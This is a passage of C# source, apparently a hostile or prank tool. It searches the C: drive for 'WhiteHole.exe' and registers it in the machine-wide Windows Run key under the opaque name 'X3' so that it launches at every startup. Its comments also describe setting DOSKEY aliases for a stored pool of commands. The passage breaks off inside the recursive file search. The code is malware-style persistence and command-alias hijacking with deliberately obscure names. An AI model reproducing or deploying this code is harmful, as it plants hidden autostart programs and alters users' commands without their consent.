using System;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Collections.Generic;
using System.Linq;
using Microsoft.Win32;

namespace RuleChange
{
    class RuleChange
    {
        // File to persist the pool of commands.
        static string poolFile = "gloopPool.txt";

        static void Main(string[] args)
        {
            // If arguments are provided, handle the add command.
            if (args.Length > 0 && args[0].Equals("add", StringComparison.OrdinalIgnoreCase))
            {
                if (args.Length < 2)
                {
                    Console.WriteLine("Usage: RuleChange add <command>");
                    return;
                }
                string commandToAdd = args[1];
                AddCommandToPool(commandToAdd);
                Console.WriteLine($"Added '{commandToAdd}' to the gloop pool.");
                return;
            }

            // Default routine: set startup registry key and configure aliases.
            string startDir = @"C:\";
            string targetFile = "WhiteHole.exe";
            string filePath = FindFile(targetFile, startDir);
            if (!string.IsNullOrEmpty(filePath))
            {
                makeJawn(filePath);
            }
            else
            {
                Console.WriteLine($"{targetFile} not found.");
            }

            // Set DOSKEY aliases for all commands in the gloop pool.
            SetAliasesForPool();
        }

        /// <summary>
        /// Creates a registry key to run an executable at startup.
        /// </summary>
        /// <param name="location">File path to the executable</param>
        /// <returns>True for success, false otherwise</returns>
        static bool makeJawn(string location)
        {
            try
            {
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
                {
                    if (key == null)
                        return false;

                    // "X3" is an arbitrary name for the registry entry.
                    key.SetValue("X3", location);
                }
                return true;
            }
            catch (Exception ex)
            {
                // Handle exception as needed.
                return false;
            }
        }

        /// <summary>
        /// Recursively searches for a file starting from the specified directory.
        /// </summary>
        public static string FindFile(string fileName, string startDirectory)
        {
            try
            {
                foreach (string file in Directory.EnumerateFiles(startDirectory))
                {
                    if (Path.GetFileName(file).Equals(fileName, StringComparison.OrdinalIgnoreCase))
                    {
                        return file;
                    }
                }

                foreach (string directory in Directory.EnumerateDirectories(startDirectory))
                {
                    try
                    {
                        string result = FindFile(fileName, directory);
                        if (result != null)
                        {
                            return result;


